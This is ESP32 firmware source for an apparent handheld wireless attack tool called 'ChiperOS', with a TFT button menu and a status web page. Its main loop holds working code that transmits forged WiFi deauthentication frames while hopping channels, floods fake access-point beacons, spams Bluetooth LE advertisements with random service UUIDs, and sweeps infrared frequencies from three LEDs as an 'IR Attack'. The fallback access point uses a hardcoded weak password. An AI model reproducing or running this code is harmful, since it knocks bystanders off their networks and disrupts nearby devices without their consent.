// 🛡️ ChiperOS v3.1 - Bruce-style Menu + Animations + Fixed Errors
#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <TFT_eSPI.h>
...
// === PINS ===
#define BTN_UP    0   // BTN1: Вверх / Пред. пункт
#define BTN_SEL   1   // BTN2: Выбор / Подтвердить
#define BTN_DOWN  2   // BTN3: Вниз / След. пункт
#define IR1 38
#define IR2 39
#define IR3 40
...
bool menuActive = true; // По умолчанию показываем меню на TFT
...
MenuItem mainMenu[] = {
  {"WIFI", nullptr},
  {"IR", nullptr},  {"Bluetooth", nullptr},
  {"Setting", nullptr}
};

MenuItem wifiMenu[] = {
  {"WiFi Scan", [](){ tftDrawAnim("Scanning WiFi..."); int n=WiFi.scanNetworks(); tftDrawAnim("Found: "+String(n)); }},
  ...
  {"EXIT", [](){ currentMenu=MAIN; menuIdx=0; }}
};

MenuItem irMenu[] = {
  {"IR Attack (Select)", [](){ irGunOn=!irGunOn; tftDrawAnim(irGunOn?"IR Sweep ON":"IR Sweep OFF"); }},
...
MenuItem setMenu[] = {
  {"Diagnostic Mode", [](){ tftDrawAnim("Diag: Heap "+String(ESP.getFreeHeap()/1024)+"KB"); }},
  {"Device Info", [](){ 
    tftDrawAnim("ESP32-S3 N16R8"); 
    delay(500); 
    tftDrawAnim("PSRAM: "+String(ESP.getPsramSize()/1024)+"MB"); 
  }},
  {"EXIT", [](){ currentMenu=MAIN; menuIdx=0; }}
};

MenuItem* currentMenuPtr = mainMenu;
...
void switchMode();void enterSafeMode();
void checkRecovery();
...
void setup() {
  ...
  for(int i=0; i<200; i+=10) { tft.fillRect(20, 140, i, 10, TFT_GREEN); delay(30); }
  
  tft.fillScreen(TFT_BLACK);
  Serial.println("✅ ChiperOS v3.1 Ready");
  ...
  server.on("/st", [](){
    if (inSafeMode) server.send(200, "application/json", "{\"h\":" + String(ESP.getFreeHeap()/1024) + "}");
    else {
      String s = "DEAUTH:"+(deauthOn?"ON":"OFF")+"|FAKE:"+(fakeApOn?"ON":"OFF")+"|BLE:"+(bleOn?"ON":"OFF")+"|IR:"+(irGunOn?"ON":"OFF");
      s += "<br>Heap:"+String(ESP.getFreeHeap()/1024)+"KB Uptime:"+String((millis()-bootTime)/1000)+"s";      server.send(200, "text/html", s);
    }
  });
  server.begin();
...
void switchMode() {
  ...
  if(attack && currentMode==WEB_MODE){
    currentMode=ATTACK_MODE; server.stop(); WiFi.softAPdisconnect(true); esp_wifi_set_promiscuous(true);
  } else if(!attack && currentMode==ATTACK_MODE){
    currentMode=WEB_MODE; esp_wifi_set_promiscuous(false); WiFi.mode(WIFI_MODE_AP); WiFi.softAP("ChiperOS","12345678"); server.begin();
  }
}
...
void tftDrawMenu() {
  tft.fillScreen(TFT_BLACK);  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.setTextFont(2);
  ...
  MenuItem* items = (currentMenu==MAIN)?mainMenu:(currentMenu==WIFI_MENU)?wifiMenu:(currentMenu==IR_MENU)?irMenu:(currentMenu==BT_MENU)?btMenu:setMenu;
  
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  for(int i=0; i<=maxIdx; i++) {
    int y = 30 + i*35;
    if(i == menuIdx) {
      tft.fillRect(10, y-2, 220, 30, TFT_DARKGREEN);
      tft.setTextColor(TFT_BLACK, TFT_DARKGREEN);
    } else {
      tft.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
    }
    tft.drawString(" " + items[i].name, 15, y);
  }
}
...
void tftDrawAnim(const String& msg) {
  ...
  for(int i=0; i<200; i+=20) { tft.fillRect(20, 120, i, 8, TFT_GREEN); delay(50); }
  delay(500);
  tftDrawMenu();
}
...
void loop() {
  ...
  if(digitalRead(BTN_UP)==LOW || digitalRead(BTN_DOWN)==LOW || digitalRead(BTN_SEL)==LOW) {
    if(!btnPressed) { btnPressTime = millis(); btnPressed = true; }
    if(millis() - btnPressTime > 250 && btnPressed) { // Debounce + Hold detection
      btnPressed = false;
      
      if(digitalRead(BTN_UP)==LOW && digitalRead(BTN_DOWN)==LOW) { // Emergency combo
        enterSafeMode();
        ...
        tftDrawMenu();      } else if(digitalRead(BTN_SEL)==LOW) {
        MenuItem* items = (currentMenu==MAIN)?mainMenu:(currentMenu==WIFI_MENU)?wifiMenu:(currentMenu==IR_MENU)?irMenu:(currentMenu==BT_MENU)?btMenu:setMenu;
        if(items[menuIdx].action) {
          items[menuIdx].action();
        } else {
          if(currentMenu==MAIN) {
            if(menuIdx==0) currentMenu=WIFI_MENU;
            else if(menuIdx==1) currentMenu=IR_MENU;
            else if(menuIdx==2) currentMenu=BT_MENU;
            else if(menuIdx==3) currentMenu=SET_MENU;
            menuIdx=0;
            tftDrawMenu();
          }
        }
  ...
  if(currentMode==WEB_MODE || inSafeMode) server.handleClient();
  checkRecovery();
  handleSerialCommand();

  if(!inSafeMode) {
    if(deauthOn && millis()-lastDeauth>10){ lastDeauth=millis(); static int ch=1; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); ch=(ch==1)?6:(ch==6)?11:1; deauthFrame[22]=random(256); deauthFrame[23]=random(256); esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, 26, false); }
    if(fakeApOn && millis()-lastFakeAp>200){ lastFakeAp=millis(); 
      uint8_t b[128]; memset(b,0,128); b[0]=0x80; b[1]=0x00; memset(&b[4],0xFF,6); b[10]=0x02; b[11]=0x00; b[12]=0x00; b[13]=0x00; b[14]=0x00; b[15]=random(6); memcpy(&b[16],&b[10],6); 
      uint64_t ts = (uint64_t)micros(); memcpy(&b[24], &ts, 8); b[32]=0xE8; b[33]=0x03; b[34]=0x01; b[35]=0x00; int p=36; String n="LOL_BRO"; b[p++]=0x00; b[p++]=n.length(); memcpy(&b[p],n.c_str(),n.length()); p+=n.length(); b[p++]=0x01; b[p++]=0x08; b[p++]=0x82; b[p++]=0x84; b[p++]=0x8B; b[p++]=0x96; b[p++]=0x24; b[p++]=0x30; b[p++]=0x48; b[p++]=0x6C; esp_wifi_80211_tx(WIFI_IF_AP, b, p, false); 
    }
    if(bleOn && millis()-lastBle>100){ lastBle=millis(); BLEAdvertising* p=BLEDevice::getAdvertising(); p->stop(); p->addServiceUUID(BLEUUID((uint16_t)random(0x1800,0x2000))); p->setMinPreferred(0x06); p->setMaxPreferred(0x12); p->start(); }
    if(irGunOn && millis()-lastIr > irPulseLen){ lastIr = millis(); ledcSetup(0, irFreq, 8); ledcSetup(1, irFreq, 8); ledcSetup(2, irFreq, 8); ledcWrite(0, 85); ledcWrite(1, 85); ledcWrite(2, 85); if(irFwd) { irFreq += irFreqStep; if(irFreq >= irFreqMax) { irFreq = irFreqMax; irFwd = false; } } else { irFreq -= irFreqStep; if(irFreq <= irFreqMin) { irFreq = irFreqMin; irFwd = true; } } }
  }
  yield();
}
